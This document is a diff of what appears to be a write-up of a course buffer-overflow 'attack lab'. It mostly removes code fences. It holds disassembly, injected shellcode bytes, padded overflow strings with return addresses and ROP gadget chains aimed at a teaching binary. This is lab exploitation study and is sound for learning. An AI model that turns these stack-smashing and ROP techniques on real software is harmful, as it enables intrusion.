@@ -31,7 +31,7 @@ exit(0);
 4017c4:c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
 4017cb:00 00 00 
 4017ce:bf c5 30 40 00       	mov    $0x4030c5,%edi
-4017d3:e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
+4017d3:e8 e8 f4 ff ff       	callq  400cc0 
 4017d8:bf 01 00 00 00       	mov    $0x1,%edi
 4017dd:e8 ab 04 00 00       	callq  401c8d <validate>
 4017e2:bf 00 00 00 00       	mov    $0x0,%edi
@@ -90,7 +90,8 @@ ret
 gcc -c phase_2_asm.s
 objdump -d phase_2_asm > phase_2_asm.asm
 
-phase_2_asm.o:file format elf64-x86-64
+phase_2_asm.o:
+file format elf64-x86-64
 
 Disassembly of section .text:
 
@@ -279,22 +280,12 @@ int val;
     val = getbuf();
 printf("No exploit. Getbuf returned 0x%xn", val);
 }
-```
-
-
-
-```
 voidtouch1(){
     vlevel = 1; /* Part of validation protocol */
 printf("Touch1!: You called touch1()n");
 validate(1);
 exit(0);
 }
-```
-
-
-
-```
 00000000004017a8 <getbuf>:
 4017a8:48 83 ec 28          sub    $0x28,%rsp
 4017ac:48 89 e7             	mov    %rsp,%rdi
@@ -304,43 +295,23 @@ exit(0);
 4017bd:c3                   	retq   
 4017be:90                   	nop
 4017bf:90                   	nop
-```
-
-
-
-```
 00000000004017c0 <touch1>:
 4017c0:48 83 ec 08          sub    $0x8,%rsp
 4017c4:c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
 4017cb:00 00 00 
 4017ce:bf c5 30 40 00       	mov    $0x4030c5,%edi
-4017d3:e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>
+4017d3:e8 e8 f4 ff ff       	callq  400cc0 
 4017d8:bf 01 00 00 00       	mov    $0x1,%edi
 4017dd:e8 ab 04 00 00       	callq  401c8d <validate>
 4017e2:bf 00 00 00 00       	mov    $0x0,%edi
 4017e7:e8 54 f6 ff ff       	callq  400e40 <exit@plt>
-```
-
-
-
-```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 C0 17 40 00
-```
-
-
-
-```
 ./hex2raw < phase_1 | ./ctarget -q
-```
-
-
-
-```
 voidtouch2(unsigned val) {
     vlevel = 2;
 if (val == cookie) {
@@ -353,11 +324,6 @@ fail(2);
     }
 exit(0);
 }
-```
-
-
-
-```
 00000000004017ec <touch2>:
 4017ec:48 83 ec 08          sub    $0x8,%rsp
 4017f0:89 fa                mov    %edi,%edx
@@ -380,32 +346,13 @@ exit(0);
 40183d:e8 0d 05 00 00       	callq  401d4f <fail>
 401842:bf 00 00 00 00       	mov    $0x0,%edi
 401847:e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
-```
-
-
-
-```
 movq $0x59b997fa, %rdi
-```
-
-
-
-```
 pushq $0x4017ec
 ret
-```
-
-
-
-```
 gcc -c phase_2_asm.s
 objdump -d phase_2_asm > phase_2_asm.asm
-```
-
-
-
-```
-phase_2_asm.o:file format elf64-x86-64
+phase_2_asm.o:
+file format elf64-x86-64
 
 Disassembly of section .text:
 
@@ -413,46 +360,21 @@ Disassembly of section .text:
 0:48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
 7:68 ec 17 40 00       	pushq  $0x4017ec
 c:c3                   	retq
-```
-
-
-
-```
 48 c7 c7 fa 97 b9 59 68
 ec 17 40 00 c3
-```
-
-
-
-```
 48 c7 c7 fa 97 b9 59 68
 ec 17 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 78 dc 61 55
-```
-
-
-
-```
 ./hex2raw < phase_2 | ./ctarget -q
-```
-
-
-
-```
 inthexmatch(unsigned val, char *sval) {
 char cbuf[110];
 char *s = cbuf + random() % 100;
 sprintf(s, "%.8x", val);
 return strncmp(sval, s, 9) == 0;
 }
-```
-
-
-
-```
 voidtouch3(char *sval) {
     vlevel = 3;
 if (hexmatch(cookie, sval)) {
@@ -465,31 +387,16 @@ fail(3);
     }
 exit(0);
 }
-```
-
-
-
-```
 0000000000000000 <.text>:
 0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
 7:	68 fa 18 40 00       	pushq  $0x4018fa
     c:	c3                   retq
-```
-
-
-
-```
 48 c7 c7 a8 dc 61 55 68 
 fa 18 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 
 78 dc 61 55
-```
-
-
-
-```
 48 c7 c7 a8 dc 61 55 68 
 fa 18 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00 
@@ -497,35 +404,15 @@ fa 18 40 00 c3 00 00 00
 00 00 00 00 00 00 00 00 
 78 dc 61 55 00 00 00 00
 35 39 62 39 39 37 66 61
-```
-
-
-
-```
 voidsetval_210 (unsigned *p) {
     *p = 3347663060U;
 }
-```
-
-
-
-```
 0000000000400f15 <setval_210>:
 400f15:       c7 07 d4 48 89 c7    movl  $0xc78948d4, (%rdi)
 400f1b:       c3                   retq
-```
-
-
-
-```
 movq $0x59b997fa, %rdi
 pushq $0x4017ec
 ret
-```
-
-
-
-```
 gadget1: 
 popq %rax
 ret
@@ -533,27 +420,12 @@ ret
 gadget2: 
 mov %rax, %rdi
 ret
-```
-
-
-
-```
 00000000004019ca <getval_280>:
 4019ca:	b8 29 58 90 c3       mov    $0xc3905829,%eax
 4019cf:	c3                   retq
-```
-
-
-
-```
 00000000004019a0 <addval_273>:
 4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
 4019a6:	c3                   retq
-```
-
-
-
-```
 ---- Stack ----
 -------------
 full of zero | getbuf的栈帧
@@ -564,11 +436,6 @@ gadget2      |
 touch2       |
 -------------
 ---------------
-```
-
-
-
-```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
@@ -578,28 +445,13 @@ cc 19 40 00 00 00 00 00
 fa 97 b9 59 00 00 00 00
 a2 19 40 00 00 00 00 00
 ec 17 40 00 00 00 00 00
-```
-
-
-
-```
 mov %rsp, %rax
 add $bias, %rax
 mov %rax, %rdi
 call touch3
-```
-
-
-
-```
 00000000004019d6 <add_xy>:
 4019d6:	48 8d 04 37          lea    (%rdi,%rsi,1),%rax
 4019da:	c3                   retq
-```
-
-
-
-```
 ---- Stack ----
 --------------------------------------------
 full of zero                                | getbuf的栈帧
@@ -617,11 +469,6 @@ Address of touch3: 0x4018fa                 |
 ASCII of cookie: 35 39 62 39 39 37 66 61 00 |
 --------------------------------------------
 ---------------
-```
-
-
-
-```
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
